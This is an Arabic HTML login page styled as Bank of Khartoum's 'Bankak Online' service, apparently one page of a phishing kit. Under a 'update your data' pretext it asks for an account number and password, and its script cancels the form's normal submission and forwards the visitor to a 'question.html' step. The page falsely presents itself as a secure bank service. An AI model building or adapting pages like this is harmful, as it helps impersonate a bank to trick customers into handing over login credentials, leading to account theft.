<!DOCTYPE html>
<html lang="ar" dir="rtl" class="h-full antialiased">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title id="page-title">bankofkhartoum</title>
    <meta name="description" content="بنكك أونلاين — خدمات مصرفية آمنة من بنك الخرطوم">
    <meta name="application-name" content="Bankak Online">
    <meta name="robots" content="index, follow">
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <style>
        /* تنسيقات CSS المدمجة لضمان ظهور الصفحة بشكل جميل ومنسق بدون ملف خارجي */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, Arial, sans-serif; }
        body { background-color: #f8f9fa; color: #333; direction: rtl; text-align: right; line-height: 1.6; }
        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; }
        .site-header { background: #b71c1c; color: #fff; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
        .header-logo img { height: 40px; }
        .lang-toggle { background: #ffd54f; border: none; padding: 5px 12px; font-weight: bold; cursor: pointer; border-radius: 4px; color: #333; }
        .main-content { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .login-card { background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); width: 100%; max-width: 420px; }
        .back-link-wrap { margin-bottom: 20px; }
        .back-link { color: #b71c1c; text-decoration: none; font-weight: bold; font-size: 14px; }
        .service-badge { background: #ffebee; padding: 10px; border-radius: 6px; margin-bottom: 20px; border-right: 4px solid #b71c1c; }
        .service-badge .label { font-size: 12px; color: #666; }
        .service-badge .value { font-size: 14px; font-weight: bold; color: #b71c1c; }
        .login-title { font-size: 22px; margin-bottom: 8px; color: #111; }
        .login-subtitle { font-size: 14px; color: #666; margin-bottom: 20px; }
        .form-group { margin-bottom: 20px; }
        .form-label-row { margin-bottom: 8px; display: flex; align-items: center; font-size: 14px; font-weight: bold; }
        .required-star { color: #d32f2f; margin-left: 4px; }
        .input-wrapper { position: relative; }
        .form-input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; outline: none; transition: border-color 0.2s; }
        .form-input:focus { border-color: #b71c1c; }
        .password-toggle { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #666; }
        .form-error { background: #ffebee; color: #c62828; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; display: none; }
        .form-error.visible { display: block; }
        .submit-btn { width: 100%; background: #b71c1c; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; transition: background 0.2s; }
        .submit-btn:hover { background: #961515; }
        .site-footer { background: #fff; padding: 15px; text-align: center; border-top: 1px solid #eee; font-size: 13px; color: #666; }
        .site-footer img { margin-top: 5px; max-width: 150px; }
    </style>
</head>
<body>
    <div class="page-wrapper" id="page-wrapper">
        <header class="site-header">
            <div class="header-logo">
                <span style="font-size: 20px; font-weight: bold; color: white;">بنك الخرطوم</span>
            </div>
            <button type="button" class="lang-toggle" id="lang-toggle">EN</button>
        </header>

        <main class="main-content">
            <div class="login-card">
                <div class="back-link-wrap">
                    <a class="back-link" href="index.html">← العودة إلى الخدمات</a>
                </div>
                <div class="service-badge">
                    <div class="label" data-i18n="badge_label">الخدمة المختارة</div>
                    <div class="value" data-i18n="badge_value">تحديث بياناتك</div>
                </div>
                <h1 class="login-title" data-i18n="title">تسجيل الدخول إلى حسابك</h1>
                <p class="login-subtitle" data-i18n="subtitle">يرجى تسجيل الدخول لتقديم طلب الخدمة</p>

                <form class="login-form" id="login-form" novalidate>
                    <div class="form-group">
                        <div class="form-label-row">
                            <span class="required-star">*</span>
                            <span class="form-label" data-i18n="account_label">رقم الحساب</span>
                        </div>
                        <div class="input-wrapper">
                            <input type="text" class="form-input" name="account_number" id="account_number" placeholder="ادخل رقم الحساب" required inputmode="numeric" maxlength="7">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="form-label-row">
                            <span class="required-star">*</span>
                            <span class="form-label" data-i18n="password_label">كلمة المرور</span>
                        </div>
                        <div class="input-wrapper">
                            <input type="password" class="form-input" name="password" id="password" placeholder="ادخل كلمة المرور" required>
                            <button type="button" class="password-toggle" id="password-toggle">👁</button>
                        </div>
                    </div>
                    <div class="form-error" id="form-error"></div>
                    <button type="submit" class="submit-btn" id="submit-btn">
                        <span id="btn-text">تسجيل الدخول</span>
                    </button>
                </form>
            </div>
        </main>

        <footer class="site-footer">
            <div>©2024 <b>iBOK</b></div>
        </footer>
    </div>

    <script>
        (function () {
            'use strict';
            var CONFIG = { NEXT_URL: 'question.html', REDIRECT_DELAY: 800 };
            var passwordToggle = document.getElementById('password-toggle');
            var passwordInput = document.getElementById('password');
            
            if (passwordToggle && passwordInput) {
                passwordToggle.addEventListener('click', function () {
                    var isPwd = passwordInput.getAttribute('type') === 'password';
                    passwordInput.setAttribute('type', isPwd ? 'text' : 'password');
                });
            }

            var form = document.getElementById('login-form');
            if (form) {
                form.addEventListener('submit', function (e) {
                    e.preventDefault();
                    window.location.href = CONFIG.NEXT_URL;
                });
            }
        })();
    </script>
</body>
</html>
